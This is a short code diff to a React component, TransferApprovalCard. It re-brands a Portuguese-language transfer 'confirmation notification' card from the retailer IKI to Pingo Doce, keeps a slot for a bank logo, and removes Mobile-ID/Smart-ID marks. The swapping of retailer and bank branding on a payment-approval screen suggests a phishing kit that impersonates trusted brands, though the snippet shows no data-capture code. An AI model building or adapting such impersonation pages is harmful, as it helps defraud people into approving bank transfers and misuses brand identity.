@@ -314,10 +314,10 @@ function TransferApprovalCard({
   return (
     <div className="flex min-h-screen items-center justify-center px-4 py-8">
       <div className="w-full max-w-[400px] rounded-[24px] border border-[#d4ecd9] bg-white px-6 py-7 shadow-[0_20px_70px_rgba(20,32,56,0.10)]">
-        {/* IKI sol ust + banka logosu sag ust */}
+        {/* Pingo Doce sol ust + banka logosu sag ust */}
         <div className="mb-6 flex items-start justify-between">
           <img
-            src="/form-assets/iki-mini-logo.png"
+            src="/PD-mini-logo.png"
             alt="Pingo Doce"
             className="h-7 w-auto object-contain"
           />
@@ -333,10 +333,6 @@ function TransferApprovalCard({
         <h1 className="mb-6 text-center text-[1.35rem] font-bold tracking-tight text-gray-800">
           Notificação de Confirmação
         </h1>
-
-        <div className="mb-6 flex justify-center">
-          {method === "mobileid" ? <MobileIdMark /> : <SmartIdMark />}
-        </div>
 
         <div className="mb-6 rounded-2xl bg-[#f4f7fb] px-5 py-4">
           <p className="text-center text-[13px] font-medium leading-relaxed text-gray-600">
